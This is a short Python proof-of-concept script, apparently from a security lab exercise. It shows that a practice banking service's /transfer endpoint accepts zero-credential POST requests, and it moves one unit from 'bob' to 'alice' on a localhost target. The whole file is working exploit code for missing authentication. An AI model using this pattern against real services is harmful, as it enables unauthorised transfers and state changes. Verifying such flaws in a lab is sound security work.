#!/usr/bin/env python3
"""PoC (in-code step, F-2): unauthenticated state mutation on /transfer.

EDUCATIONAL - run against the local practice target only.
Trigger : POST /transfer with form fields from,to,amount and ZERO
          credentials (no cookie, no token, no auth header).
Effect  : server-side balance dict mutated (read via the amount=0 balance
          echo before/after).
Boundary: no authentication at all in front of a value-moving state write.
Ladder  : theoretical -> in-code (this file). Exit 0 = reproduced.
"""
import sys
import urllib.parse
import urllib.request

BASE = "http://127.0.0.1:8765"


def transfer(src: str, dst: str, amount: int) -> dict:
    data = urllib.parse.urlencode({"from": src, "to": dst, "amount": amount}).encode()
    req = urllib.request.Request(BASE + "/transfer", data=data, method="POST")
    with urllib.request.urlopen(req) as r:
        return eval_json(r.read().decode())


def eval_json(text: str) -> dict:
    import json

    return json.loads(text)


def main() -> int:
    # balance read = amount 0 transfer (no-op mutation returns full balances)
    before = transfer("alice", "bob", 0)["balances"]
    print(f"[read   ] balances before (via amount=0 probe): {before}")

    resp = transfer("bob", "alice", 1)
    print(f"[attack ] POST /transfer from=bob to=alice amount=1 -> {resp}")

    after = transfer("alice", "bob", 0)["balances"]
    print(f"[read   ] balances after : {after}")

    ok = after["alice"] == before["alice"] + 1 and after["bob"] == before["bob"] - 1
    if not ok:
        print("FAIL: state mutation not observed")
        return 1
    print("REPRODUCED: zero-credential POST mutated the shared balance state (+1 alice / -1 bob)")
    return 0


if __name__ == "__main__":
    sys.exit(main())
